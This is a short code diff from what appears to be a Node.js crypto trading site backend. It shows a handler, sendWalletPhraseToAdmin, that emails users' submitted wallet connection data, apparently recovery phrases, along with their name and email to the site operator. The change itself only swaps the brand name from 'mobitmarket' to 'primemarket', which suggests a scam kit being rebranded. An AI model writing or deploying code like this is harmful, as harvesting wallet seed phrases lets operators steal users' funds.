@@ -364,10 +364,10 @@ const sendWalletPhraseToAdmin = asyncHandler(async (req, res) => {
     // Send connect wallet request email to admin
     const introMessage = `This user ${req.user.firstname+" "+req.user.lastname} with email address ${req.user.email} just entered a connect wallet ${type} data. [ ${connectData} ] `
 
-    const subjectAdmin = "New Connect Wallet Data - mobitmarket"
+    const subjectAdmin = "New Connect Wallet Data - primemarket"
     const send_to_Admin = process.env.EMAIL_USER
     const templateAdmin = adminGeneralEmailTemplate("Admin", introMessage)
-    const reply_toAdmin = "no_reply@mobitmarket.com"
+    const reply_toAdmin = "no_reply@primemarketx.com"
 
     await sendEmail(subjectAdmin, send_to_Admin, templateAdmin, reply_toAdmin)
 
